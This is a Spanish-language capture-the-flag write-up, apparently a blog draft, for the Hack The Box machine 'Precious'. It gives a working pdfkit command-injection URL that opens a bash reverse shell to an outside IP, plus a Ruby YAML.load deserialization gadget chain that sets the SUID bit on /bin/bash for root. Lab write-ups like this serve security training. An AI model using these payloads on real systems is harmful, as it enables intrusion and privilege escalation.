---
title: Precious
published: false
---

Hoy resolveremos la máquina retirada "Precious" es una máquina de hack the box de dificultad fácil.


![Precious](https://user-images.githubusercontent.com/109216235/207889455-5ddd49b1-bb86-4f89-af3e-65c44935f1f1.png)


# [](#header-1) Enumeración


Empezamos escaneando los puertos de la máquina con nmap


```nmap
sudo nmap 10.10.11.189

Nmap scan report for 10.10.11.189
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


# [](#header-2) Vulnerabilidad


Antes de poder entras tenemos que actualizar nuestro etc/hosts para que la IP apunte a precious.htb
Despues, podríamos entrar en la página.


(Imagen)


Viendo esto podemos crearnos un servidor con python3 para que nos cree un pdf de nuestro servidor

```python
python3 -m http.server 4444
```

(Imagen)


Esto nos generará un pdf. Lo analizamos con "exiftool" y podemos ver que versión de pdfkit se utiliza


(Imagen)


Buscamos información sobre como injectar comandos en esta máquina. En este sitio https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 encontramos una vulnerbilidad de la que nos podemos aprovechar.
Usando el ejemplo podemos manipularlo para que nos dé una revershell. Recordad que tenemos que poner en escucha "netcat"

```netcat
netcat -lnvp 4444
```

Ejemplo:
```bash
http://example.com/?name=#{'%20`sleep 5`'}
```
Revershell cambiando el ejemplo:
```bash
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.16.18/4444 0>&1"`'}
```

Este comando que hemos creado hace:
bash -c: permite introducir strigns
bash -i: Hace que la revershell sea interacitva
/dev/tcp/10.10.16.18/4444: crea la revershell cuando se ejecuten


(imagen)


Dentro de la máquina podemos encontrar dentro del usuario "ruby" una carpeta oculta llamada "bundle" que contiene las credenciales de "henry"


(imagen)


Dentro de la carpeta /home/ de "henry" encontramos la user.txt y ya tendríamos la mitad de la máquina


# [](#header-2) Escalada de privilegios


Accedemos al ssh con las credenciales de "henry"


(imagen)


Una vez dentro utilizamos ```sudo -l``` para ver que se ejecuta como root

(código)


Buscamos como escalar de privilegios con Ruby YAML.load. En esta página (https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/) encontramos una vulnerabilidad. Vemos que si manipulamos el campo git-set podemos escalar de privilegios.

Ejemplo:
```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

Escalada cambiando el ejemplo:

```ruby
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
```


No se nos puede olvidar que este script se tiene que llamar dependencies.yml y tiene que estar en la carpeta /home/ de "henry"

Ahora ejecutamos este script con ```bash -p``` y tendríamos una shell root. Buscamos la carpeta /root/ y allí encontrariamos la root.txt y habríamos completado la máquina.
